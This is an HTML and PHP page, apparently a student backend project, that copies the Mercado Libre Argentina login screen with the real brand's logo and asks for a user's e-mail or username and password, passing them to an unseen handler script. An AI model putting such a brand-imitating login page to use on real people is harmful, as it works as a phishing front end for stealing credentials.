<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Mercado Libre Argentina</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-T3c6CoIi6uLrA9TneNEoa7RxnatzjcDSCmG1MXxSR1GAsXEV/Dwwykc2MPK8M2HN" crossorigin="anonymous">
    <link rel="stylesheet" href="public/css/style.css"/>
    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/5.21.22/mercadolibre/favicon.svg">
</head>
<body>
    <nav class="navbar navbar-expand-lg bg-body-tertiary">
        <div class="container-fluid">
            <a href="../ProyectoBackend">
              <img class="img-fluid col-8 offset-2" src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.5.5/mercadolibre/logo__large_plus@2x.png">
            </a>
            <div class="navbar-collapse" id="navbarTogglerDemo03">
              <form class="d-flex col-10 offset-2" role="search">
              </form>
            </div>
        </div>
    </nav>

    <form method="post" action="">
    <section class="login">
        <div class="loginPanel1">
            <h3>Ingresá tu e‑mail, teléfono o usuario de Mercado Libre</h3>
            <p>Reportar un problema</p>
        </div>
        <div class="loginPanel2">
        <?php
        include("loginHandler.php");
        ?>
            <p>E‑mail, teléfono o usuario</p>
            <input name="user" class="form-control me-2" type="search" placeholder="" aria-label="Search">
            <p>Contraseña</p>
            <form class="d-flex col-10">
                <input name="password" class="form-control me-2" type="password" placeholder="" aria-label="Search">
            </form>
            <div class="d-flex col-10">
            <input type="submit" class="mlBtn" name="btnlog" value="Continuar">
            <button class="mlBtn-secondary">Crear cuenta</button>
            </div>
        </div>
    </section>
    
    </form>
    
</body>
</html>